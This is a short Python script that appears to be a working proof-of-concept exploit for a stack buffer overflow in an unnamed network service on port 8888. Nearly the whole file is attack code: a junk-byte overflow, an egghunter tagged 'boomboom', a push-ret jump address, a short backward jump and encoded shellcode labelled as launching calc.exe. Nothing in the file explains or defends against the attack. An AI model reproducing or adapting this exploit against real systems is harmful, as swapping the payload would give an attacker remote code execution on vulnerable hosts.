import socket

egg = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74" #boom
"\xef\xb8\x62\x6f\x6f\x6d\x8b\xfa" 
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

target="127.0.0.1"
junk="A"*1015			
jmp="\xd9\x37\x99\x69"  #0x699937d9 push ret
jump_back="\xeb\xc4"    #jump -60 bytes


#Shellcode calc.exe
buf =  b""
buf += b"\xbd\xa3\x82\x3e\xb3\xda\xd9\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x3e\x31\x6a\x14\x03\x6a\x14\x83\xea\xfc\x41"
buf += b"\x77\xc2\x5b\x07\x78\x3b\x9c\x67\xf0\xde\xad\xa7\x66"
buf += b"\xaa\x9e\x17\xec\xfe\x12\xdc\xa0\xea\xa1\x90\x6c\x1c"
buf += b"\x01\x1e\x4b\x13\x92\x32\xaf\x32\x10\x48\xfc\x94\x29"
buf += b"\x83\xf1\xd5\x6e\xf9\xf8\x84\x27\x76\xae\x38\x43\xc2"
buf += b"\x73\xb2\x1f\xc3\xf3\x27\xd7\xe2\xd2\xf9\x63\xbd\xf4"
buf += b"\xf8\xa0\xb6\xbc\xe2\xa5\xf2\x77\x98\x1e\x89\x89\x48"
buf += b"\x6f\x72\x25\xb5\x5f\x81\x37\xf1\x58\x79\x42\x0b\x9b"
buf += b"\x04\x55\xc8\xe1\xd2\xd0\xcb\x42\x91\x43\x30\x72\x76"
buf += b"\x15\xb3\x78\x33\x51\x9b\x9c\xc2\xb6\x97\x99\x4f\x39"
buf += b"\x78\x28\x0b\x1e\x5c\x70\xc8\x3f\xc5\xdc\xbf\x40\x15"
buf += b"\xbf\x60\xe5\x5d\x52\x75\x94\x3f\x39\x88\x2a\x3a\x0f"
buf += b"\x8a\x34\x45\x20\xe2\x05\xce\xaf\x75\x9a\x05\x94\x89"
buf += b"\xd0\x04\xbd\x01\xbd\xdc\xff\x4c\x3e\x0b\xc3\x68\xbd"
buf += b"\xbe\xbc\x8f\xdd\xca\xb9\xd4\x59\x26\xb0\x45\x0c\x48"
buf += b"\x67\x66\x05\x0b\xbd\xc4\xde\xed\xac\x84\x6e\xb2\x46"
buf += b"\x10\xeb\x25\xf4\xab\xaf\xde\x83\x26\x0c\x54\x04\xd4"
buf += b"\xc3\xf7\x80\x78\x72\x9b\x66\xe5\xf2\x3e\x57\xc8\x67"
buf += b"\xe1\xf4\x7f\x0c\xcf\x9f\x07\xa9\x2f\x51\xc7\x1f\x01"
buf += b"\xa1\x09\x51\x55\xef\x6c\xa3\xb5\xdb\xba\xf7\x81\x23"

payload1=junk+egg+"B"*5 + jmp + jump_back
payload2="boomboom" + buf

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload1+payload2)
except:
	print "Don't Crash Me !"
